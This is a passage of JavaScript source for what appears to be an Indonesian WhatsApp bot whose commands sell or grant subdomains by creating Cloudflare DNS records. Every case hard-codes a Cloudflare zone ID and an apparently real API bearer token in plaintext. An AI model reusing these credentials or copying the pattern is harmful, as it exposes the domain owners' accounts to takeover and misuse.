               let apitoken = "qKl5LyFBfNJgnI8n4ZDbgiL65OQMkEJL8GgITWs9";
               let tld = "rafatharoffcial-private.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By Rafathar Offcial⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
          break
          case 'domain56': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!isPremium && !isOwner) return reply(mess.only.premium)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "724a897776db0b5e48f2b0b95356bda7";
               let apitoken = "qKl5LyFBfNJgnI8n4ZDbgiL65OQMkEJL8GgITWs9";
               let tld = "amaliasyva-private.tech";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RafatharOffcial⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
          case 'domain57': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!isPremium && !isOwner) return reply(mess.only.premium)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "00b7a88bfc1bfd5ae9a12e550ab45230";
               let apitoken = "qKl5LyFBfNJgnI8n4ZDbgiL65OQMkEJL8GgITWs9";
               let tld = "kangpane.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RafatharOffcial⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
          case 'domain58': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!isPremium && !isOwner) return reply(mess.only.premium)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "de3a846268898e19447018bcba035001";
               let apitoken = "qKl5LyFBfNJgnI8n4ZDbgiL65OQMkEJL8GgITWs9";
               let tld = "rizalxalfi.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RafatharOffcial⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
          case 'buydomain1': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (cekSaldo(sender,db_saldo) < 10000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp10000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "724a897776db0b5e48f2b0b95356bda7";
               let apitoken = "_JGPqDOBXRxtdVSMi6bFar2LUYUI-6PF2ZqKXz1g";
               let tld = "amaliasyva-private.tech";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: true },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RafatharOffcial⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           minSaldo(sender, 10000, db_saldo)
           break
          case 'buydomain2': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (cekSaldo(sender,db_saldo) < 5000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp5000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "e0f9412065e53bd57bde671aa36345a9";
               let apitoken = "MDVzjxiioRJ9uO8UnGuvqIIcahrstb-mjlgECNbw";
               let tld = "panelku.link";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RafatharOffcial⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           minSaldo(sender, 5000, db_saldo)
           break
          case 'buydomain3': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (cekSaldo(sender,db_saldo) < 10000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp10000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "74fc380e8c21521fdb09363ae57b8b92";
               let apitoken = "xGFeJ0uxY6G8xQKnpwDKKFpz_2umbCwddUSsNZEx";
               let tld = "sanzyy.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RafatharOffcial⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           minSaldo(sender, 10000, db_saldo)
            break
          case 'buydomain4': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (cekSaldo(sender,db_saldo) < 3000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp3000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "0aec98100985db6fa9390b8983c1e9b8";
               let apitoken = "_JGPqDOBXRxtdVSMi6bFar2LUYUI-6PF2ZqKXz1g";
               let tld = "home-panel.pw";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: true },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RafatharOffcial⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           minSaldo(sender, 3000, db_saldo)
           break
          case 'buydomain5': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (cekSaldo(sender,db_saldo) < 3000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp3000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "80eccb8365dd03f4cd3408ed221f0a30";
               let apitoken = "UiM1CzcdcAYE_0wK1cv6nknLhR83lLywzzGQ5Q3r";
               let tld = "aswinxd.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RafatharOffcial⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           minSaldo(sender, 3000, db_saldo)
           break
          case 'buydomain6': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (cekSaldo(sender,db_saldo) < 10000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp10000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "433a5c33932fa9ae50165c9df5e15f0e";
               let apitoken = "_JGPqDOBXRxtdVSMi6bFar2LUYUI-6PF2ZqKXz1g";
               let tld = "panel-zall.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: true },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RafatharOffcial⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           minSaldo(sender, 10000, db_saldo)
           break
          case 'buydomain7': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (cekSaldo(sender,db_saldo) < 2000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp2000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "d4a6adffd3dd317753c4401e38cb7949";
               let apitoken = "oMSalNry5ByDu_PBJhTAxNOhQiYKjWQImKKDIhWh";
               let tld = "digital-market.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RafatharOffcial⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           minSaldo(sender, 2000, db_saldo)
           break
          case 'buydomain8': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (cekSaldo(sender,db_saldo) < 2000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp2000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "e13ba8568f6e44ca927569da961d9eb6";
               let apitoken = "bTF2B2fQNe0nJL62gTuGQEbeZCEbOC0FpGWB-ESr";
               let tld = "rafatharofficial.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RafatharOffcial⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           minSaldo(sender, 2000, db_saldo)
           break
          case 'buydomain9': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (cekSaldo(sender,db_saldo) < 2000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp2000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "fb96c7c37f24377704b78f5cc41af7a5";
               let apitoken = "XL-sfJZLBRtXDxkZ9ElUuxTLTwi95P-z-Ei14pDt";
               let tld = "tokodigital.software";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RafatharOffcial⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           minSaldo(sender, 2000, db_saldo)
           break    
case 'buydomain10': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (cekSaldo(sender,db_saldo) < 4000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp4000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "e9fa18b714b6ee8987cad8e26fb30d64";
               let apitoken = "fXnytgaVk-_2NASioBjIhLFTib1kX19OAPi9h-KJ";
               let tld = "storehost.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
